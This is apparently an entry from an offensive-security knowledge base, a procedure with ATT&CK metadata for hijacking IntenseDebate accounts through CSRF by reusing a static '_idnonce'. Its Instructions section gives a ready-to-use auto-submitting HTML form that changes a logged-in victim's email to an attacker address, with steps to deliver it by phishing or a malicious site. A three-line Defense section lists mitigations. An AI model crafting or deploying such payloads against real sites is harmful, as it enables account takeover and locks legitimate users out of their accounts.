---
id: p4d5e6f7-h8i9-0123-defg-456789012345
tags:
  - csrf
  - account-hijack
  - web
type: procedure
tools: []
tactics:
  - '[[Defense Evasion]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:58.361Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-CSRF-for-Email-Hijacking

## Summary

This procedure crafts and executes a CSRF proof-of-concept using the static '_idnonce' to change a victim's account email back to the attacker's, revoking victim access on IntenseDebate.

## Description

With the victim logged in, load an HTML page containing an auto-submitting form that POSTs to https://intensedebate.com/edit-user-account. The form includes the reused '_idnonce', attacker's email, empty passwords, and 'chk_email_reply'='T'. Due to the nonce's static nature, it bypasses CSRF protection, updating the email and logging out the victim. Delivery via phishing or malicious site.

## Requirements

1. Extracted '_idnonce' value
2. Victim's browser logged into the account
3. Attacker's email for target change

## Defense

Defensive measures and detection strategies:

- Bind nonces to user sessions and regenerate on changes
- Use same-site cookies and token double-submission
- Monitor for anomalous email changes post-login

## Objectives

1. Forge email change request via CSRF
2. Reclaim email control from victim
3. Lock out victim from account

## Instructions

### Step 1: Craft CSRF HTML PoC

**Context**: Create the malicious form.

No command; write HTML:

```html
<html><body><form action="https://intensedebate.com/edit-user-account" method="POST">
<input type="hidden" name="_idnonce" value="45898fbb7a">
<input type="hidden" name="email" value="attacker.781x@yahoo.com">
<input type="hidden" name="old_password" value="">
<input type="hidden" name="new_password" value="">
<input type="hidden" name="chk_email_reply" value="T">
</form><script>document.forms[0].submit();</script></body></html>
```

> Save as .html and host or deliver to victim.

### Step 2: Load on Victim Browser

**Context**: Trigger submission while victim is authenticated.

No command; have victim open the HTML file or link.

> Expected: Auto-submit changes email; victim logged out.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[account-hijack]]
- [[web]]
